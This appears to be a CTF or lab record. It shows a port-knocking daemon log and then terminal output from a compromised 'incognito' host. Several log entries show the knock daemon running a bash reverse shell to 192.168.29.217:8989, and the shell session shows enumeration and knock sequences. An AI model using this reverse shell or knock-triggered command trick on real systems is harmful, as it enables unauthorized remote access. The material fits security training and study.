[2021-06-11 07:32] 192.168.29.217: closeSSH: Stage 1
[2021-06-11 07:32] 192.168.29.217: closeSSH: Stage 2
[2021-06-11 07:32] 192.168.29.217: closeSSH: Stage 3
[2021-06-11 07:32] 192.168.29.217: closeSSH: OPEN SESAME
[2021-06-11 07:32] closeSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j REJECT

[2021-06-11 07:33] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:33] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:33] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:33] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:33] openSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j ACCEPT

[2021-06-11 07:36] waiting for child processes...
[2021-06-11 07:36] shutting down
[2021-06-11 07:36] starting up, listening on enp0s3
[2021-06-11 07:36] 192.168.29.217: closeSSH: Stage 1
[2021-06-11 07:36] 192.168.29.217: closeSSH: Stage 2
[2021-06-11 07:36] 192.168.29.217: closeSSH: Stage 3
[2021-06-11 07:36] 192.168.29.217: closeSSH: OPEN SESAME
[2021-06-11 07:36] closeSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j REJECT

[2021-06-11 07:36] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:36] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:36] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:36] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:36] openSSH: running command: /bin/bash -i >& /dev/tcp/192.168.29.217/8989 0>&1

[2021-06-11 07:36] openSSH: command returned non-zero status code (2)
[2021-06-11 07:38] waiting for child processes...
[2021-06-11 07:38] shutting down
[2021-06-11 07:38] starting up, listening on enp0s3
[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:38] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:38] openSSH: running command: /bin/bash -c 'bash -i >& /dev/tcp/192.168.29.217/8989 0>&1'

[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:38] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:38] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:38] openSSH: running command: /bin/bash -c 'bash -i >& /dev/tcp/192.168.29.217/8989 0>&1'

[2021-06-11 07:39] waiting for child processes...
[2021-06-11 07:39] shutting down
[2021-06-11 07:39] starting up, listening on enp0s3
[2021-06-11 07:40] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:40] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:40] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:40] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:40] openSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j ACCEPT

[2021-06-11 07:43] 192.168.29.217: closeSSH: Stage 1
[2021-06-11 07:43] 192.168.29.217: closeSSH: Stage 2
[2021-06-11 07:43] 192.168.29.217: closeSSH: Stage 3
[2021-06-11 07:43] 192.168.29.217: closeSSH: OPEN SESAME
[2021-06-11 07:43] closeSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j REJECT

[2021-06-11 08:58] starting up, listening on enp0s3
[2021-06-11 08:58] 192.168.29.217: openSSH: Stage 1
[2021-06-11 08:58] 192.168.29.217: openSSH: Stage 2
[2021-06-11 08:58] 192.168.29.217: openSSH: Stage 3
[2021-06-11 08:58] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 08:58] openSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j ACCEPT

[2021-06-11 09:01] 192.168.29.217: closeSSH: Stage 1
[2021-06-11 09:01] 192.168.29.217: closeSSH: Stage 2
[2021-06-11 09:01] 192.168.29.217: closeSSH: Stage 3
[2021-06-11 09:01] 192.168.29.217: closeSSH: OPEN SESAME
[2021-06-11 09:01] closeSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j REJECT

[2021-06-11 09:02] 192.168.29.217: openSSH: Stage 1
[2021-06-11 09:02] 192.168.29.217: openSSH: Stage 2
[2021-06-11 09:03] 192.168.29.217: openSSH: Stage 3
[2021-06-11 09:03] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 09:03] openSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j ACCEPT

[2021-06-11 09:04] 192.168.29.217: closeSSH: Stage 1
[2021-06-11 09:04] 192.168.29.217: closeSSH: Stage 2
[2021-06-11 09:04] 192.168.29.217: closeSSH: Stage 3
[2021-06-11 09:04] 192.168.29.217: closeSSH: OPEN SESAME
[2021-06-11 09:04] closeSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j REJECT

[2021-08-11 09:09] starting up, listening on eth0
[2021-08-11 09:11] waiting for child processes...
[2021-08-11 09:11] shutting down
www-data@incognito:/$ 




```bash
www-data@incognito:/$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
127.0.0.1       ip6-localhost ip6-loopback
```

:~# knock -v 10.65.185.116 5020 6120 7340
hitting tcp 10.65.185.116:5020
hitting tcp 10.65.185.116:6120
hitting tcp 10.65.185.116:7340



dev2@incognito:/$ knock -v incognito 5020 6120 7340
hitting tcp 127.0.1.1:5020
hitting tcp 127.0.1.1:6120
hitting tcp 127.0.1.1:7340


<img width="1311" height="139" alt="image" src="https://github.com/user-attachments/assets/ca027dc0-d0d2-4744-87c0-95570aea54d2" />



www-data@incognito:/$ ps -eo user,command
USER     COMMAND
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
www-data php-fpm: pool www
www-data php-fpm: pool www
www-data php-fpm: pool www
root     [kworker/u4:1]









www-data@incognito:/$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
127.0.0.1       ip6-localhost ip6-loopback
www-data@incognito:/$ knock incognito 5020:tcp 6120:tcp 7340:tcp incognito 












